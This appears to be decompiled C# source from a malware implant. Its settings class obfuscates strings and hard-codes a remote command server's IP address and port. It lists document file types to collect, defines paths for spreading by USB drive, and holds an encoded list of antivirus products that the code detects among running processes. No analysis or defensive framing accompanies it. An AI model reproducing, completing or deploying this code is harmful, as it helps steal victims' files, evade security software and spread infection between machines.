using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using Microsoft.Win32;

namespace uwcrise;

public static class qurarisoSETPS
{
	public static string qurarisousbfold = "$FOUND|qurariso".Split(new char[1] { '|' })[0];

	public static string qurarisousbdate = "udata\\|qurariso".Split(new char[1] { '|' })[0];

	public static string qurarisousbDrive = "";

	public static string qurarisodowcmd = "riamdon";

	public static string qurarisofilexts = ".pdf>.doc>.docx>.xls>.xlsx>.ppt>.pptx>.pps>.ppsx>.txt>.|qurariso".Split(new char[1] { '|' })[0];

	public static string qurarisomainApp = "dlmrtens|qurariso".Split(new char[1] { '|' })[0];

	public static string qurarisousbPath = "\\Aecir\\|qurariso".Split(new char[1] { '|' })[0];

	public static bool qurarisoworking = false;

	public static byte[] qurarisoips = new byte[14]
	{
		49, 55, 51, 46, 50, 52, 57, 46, 49, 52,
		46, 49, 49, 57
	};

	public static int qurarisosysPort = 6865;

	public static string qurarisousbName = "uwcrise|qurariso".Split(new char[1] { '|' })[0];

	public static string qurarisopc_id = "azdm|qurariso".Split(new char[1] { '|' })[0];

	public static string qurarisoappPath = "\\Nvsrws\\|qurariso".Split(new char[1] { '|' })[0];

	public static string qurarisofilewrm = "flwas|qurariso".Split(new char[1] { '|' })[0];

	public static string qurarisofileusb = "flsm|qurariso".Split(new char[1] { '|' })[0];

	public static List<string> qurarisonFilders = new List<string>();

	public static string qurarisousbwrm = "mirm|qurariso".Split(new char[1] { '|' })[0];

	public static byte[] encAvs = new byte[241]
	{
		98, 100, 115, 115, 61, 66, 105, 116, 32, 68,
		101, 102, 101, 110, 100, 101, 114, 44, 111, 110,
		108, 105, 110, 101, 110, 116, 61, 81, 117, 105,
		99, 107, 32, 72, 101, 97, 108, 44, 98, 100,
		97, 103, 101, 110, 116, 61, 66, 105, 116, 32,
		68, 101, 102, 101, 110, 100, 101, 114, 32, 65,
		103, 101, 110, 116, 44, 109, 115, 115, 101, 99,
		101, 115, 61, 77, 105, 99, 114, 111, 115, 111,
		102, 116, 32, 83, 101, 99, 117, 114, 105, 116,
		121, 32, 69, 115, 115, 101, 110, 116, 105, 97,
		108, 115, 44, 102, 115, 115, 109, 51, 50, 61,
		70, 83, 101, 99, 117, 114, 101, 44, 97, 118,
		112, 61, 75, 97, 115, 112, 101, 114, 115, 107,
		121, 44, 97, 118, 103, 110, 116, 61, 65, 118,
		105, 114, 97, 44, 115, 112, 98, 98, 99, 115,
		118, 99, 61, 83, 121, 109, 97, 110, 116, 101,
		99, 44, 117, 112, 100, 97, 116, 101, 114, 117,
		105, 61, 77, 99, 65, 102, 101, 101, 44, 97,
		118, 103, 117, 105, 61, 65, 86, 71, 44, 97,
		118, 103, 99, 99, 61, 65, 86, 71, 44, 109,
		98, 97, 109, 61, 65, 110, 116, 32, 77, 97,
		108, 119, 97, 114, 101, 44, 97, 118, 97, 115,
		116, 117, 105, 61, 65, 118, 97, 115, 116, 44,
		97, 118, 97, 115, 116, 61, 65, 118, 97, 115,
		116
	};

	public static int qurarisocontries = 0;

	public static string qurarisoloadAV()
	{
		string text = "";
		try
		{
			Process[] processes = Process.GetProcesses();
			string[] array = Encoding.UTF8.GetString(encAvs, 0, encAvs.Length).Split(new char[1] { ',' });
			for (int i = 0; i < processes.Length; i++)
			{
				string value = processes[i].ProcessName.ToLower();
				for (int j = 0; j < array.Length; j++)
				{
					if (array[j].Contains(value))
					{
						string[] array2 = array[j].Split(new char[1] { '=' });
						text = text + " " + array2[1].Trim();
					}
				}
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	public static void qurarisono_folder()
	{
		qurarisonFilders.Add("program files|qurariso".Split(new char[1] { '|' })[0]);
		qurarisonFilders.Add("system volume information|qurariso".Split(new char[1] { '|' })[0]);
		qurarisonFilders.Add("$recycle.bin|qurariso".Split(new char[1] { '|' })[0]);
		qurarisonFilders.Add("msocache|qurariso".Split(new char[1] { '|' })[0]);
		qurarisonFilders.Add("recovery|qurariso".Split(new char[1] { '|' })[0]);
		qurarisonFilders.Add("documents and settings|qurariso".Split(new char[1] { '|' })[0]);
		qurarisonFilders.Add("windows|qurariso".Split(new char[1] { '|' })[0]);
		qurarisonFilders.Add("program files (x86)|qurariso".Split(new char[1] { '|' })[0]);
		qurarisonFilders.Add("programdata|qurariso".Split(new char[1] { '|' })[0]);
		qurarisonFilders.Add("usb-driver|qurariso".Split(new char[1] { '|' })[0]);
		qurarisonFilders.Add("drivers|qurariso".Split(new char[1] { '|' })[0]);
		qurarisonFilders.Add("drives|qurariso".Split(new char[1] { '|' })[0]);
		qurarisonFilders.Add("SWSetup|qurariso".Split(new char[1] { '|' })[0]);
		qurarisonFilders.Add("HPDOCBW|qurariso".Split(new char[1] { '|' })[0]);
		qurarisonFilders.Add("SYSTEM.SAV|qurariso".Split(new char[1] { '|' })[0]);
		qurarisonFilders.Add("Drivers|qurariso".Split(new char[1] { '|' })[0]);
		qurarisonFilders.Add("intel|qurariso".Split(new char[1] { '|' })[0]);
	}

	public static string qurarisoOsname()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion!uirwaras".Split(new char[1] { '!' })[0]);
			if (registryKey != null)
			{
				string text = registryKey.GetValue("ProductName!uirwaras".Split(new char[1] { '!' })[0])!.ToString()!.Trim();
				if (text != null)
				{
					return text;
				}
			}
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>2!uirwaras".Split(new char[1] { '!' })[0];
		}
	}

	public static string qurarisoget_value(string name)
	{
		string text = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion|qurariso";
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text.Split(new char[1] { '|' })[0], writable: true);
			if (registryKey.GetValue(qurarisopc_id + name) != null)
			{
				return registryKey.GetValue(qurarisopc_id + name)!.ToString()!.Trim();
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	public static string qurarisoget_mpath()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + qurarisoappPath;
	}

	public static string qurarisoget_upath()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + qurarisousbPath;
	}

	public static string qurarisouni_file(string file, int size)
	{
		try
		{
			int num = 0;
			string text = file;
			while (File.Exists(text))
			{
				if (File.ReadAllBytes(text).Length == size)
				{
					return text;
				}
				string extension = Path.GetExtension(file);
				string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(file);
				string directoryName = Path.GetDirectoryName(file);
				text = directoryName + "\\" + fileNameWithoutExtension + "(" + num + ")" + extension;
				num++;
			}
			return text;
		}
		catch
		{
			return file;
		}
	}
}
